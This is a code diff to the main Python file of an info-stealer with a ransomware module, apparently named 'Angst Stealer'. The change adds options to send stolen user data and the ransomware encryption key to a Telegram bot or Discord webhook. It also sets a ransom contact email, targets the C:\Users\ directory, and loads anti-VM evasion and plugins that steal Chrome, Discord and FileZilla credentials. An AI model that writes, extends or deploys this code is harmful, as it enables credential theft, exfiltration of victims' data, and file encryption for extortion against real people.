@@ -1,15 +1,11 @@
 import os
 import base64
-import time
-import random
-import itertools
-import sys
-import threading
 from colorama import *
 from plugins.antivm import AntiVM
 from plugins.filezilla import FileZilla
 from plugins.discord import Discord
-from plugins.send import Send
+from plugins.send_telegram import Send_Telegram
+from plugins.send_discord import Send_Discord
 from plugins.user import User
 from plugins.chrome import Chrome
 from plugins.ransomware import Ransomware
@@ -21,29 +17,46 @@ CONFIG = {
     "filezilla":True,
     "userdata":True,
     "discord":True,
+    "send_discord": False,
+    "send_telegram": True,
+    "telegram_token": "",
+    "telegram_chat_id": "",
     "ransomware" : {
         "enabled" : False,
-        "target_dir" : "C:\\Users\\", #remove the testuser at the end
+        "target_dir" : "C:\\Users\\", 
         "extenstion" : ".angst",
         "btcAddy" : "",
-        "email" : "demo.tmpacc12@gmail.com"
+        "email" : "charge@d0xbin.org"
     }
 }
 
-class AngstStealer():
+class Stealer():
     def __init__(self):
+        self.antivm = AntiVM()
         self.filezilla = FileZilla()
         self.user = User()
         self.chrome = Chrome()
         self.discord = Discord()
         self.ransomware_key = os.urandom(32)
         self.log()
-        self.send = Send(CONFIG["webhook"],
-                         self.user.userdata,
-                         base64.b64encode(self.ransomware_key),
-                         CONFIG["ransomware"]["enabled"])
+        if CONFIG["send_discord"] == True:
+            self.send = Send_Discord(CONFIG["webhook"],
+                            self.user.userdata,
+                            base64.b64encode(self.ransomware_key),
+                            CONFIG["ransomware"]["enabled"])
+        else:
+            pass
+        if CONFIG["send_telegram"] == True:
+            self.send = Send_Telegram(CONFIG["telegram_token"],
+                            CONFIG["telegram_chat_id"],
+                            self.user.userdata,
+                            base64.b64encode(self.ransomware_key),
+                            CONFIG["ransomware"]["enabled"])
+        else:
+            pass            
         self.rangst()
         self.cleanup = CleanUp()
+        print("Done!")
 
     def log(self):
         app_data = os.getenv("LOCALAPPDATA")
